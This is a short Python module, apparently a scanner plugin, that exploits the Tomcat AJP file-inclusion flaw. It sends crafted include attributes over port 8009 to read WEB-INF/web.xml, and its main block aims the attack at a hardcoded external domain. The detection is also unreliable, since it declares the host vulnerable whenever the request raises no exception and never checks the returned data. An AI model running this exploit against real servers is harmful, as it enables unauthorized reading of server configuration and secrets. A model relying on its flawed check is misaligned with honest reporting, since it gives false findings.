...
class tomcat_Ajp_lfi_BaseVerify:
    def __init__(self,url):
        self.url=url
        self.file='WEB-INF/web.xml'
    def run(self):
        try:
            t = Tomcat(self.url,8009)
            _, data = t.perform_request(f'/asdf', attributes=[
                {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', self.file]},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']},
            ])
            cprint("[+]存在Tomcat文件包含漏洞...(高危)\t","red")
            return True
        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == '__main__':
    test=tomcat_Ajp_lfi_BaseVerify('http://www.jspoh.com')
    test.run()
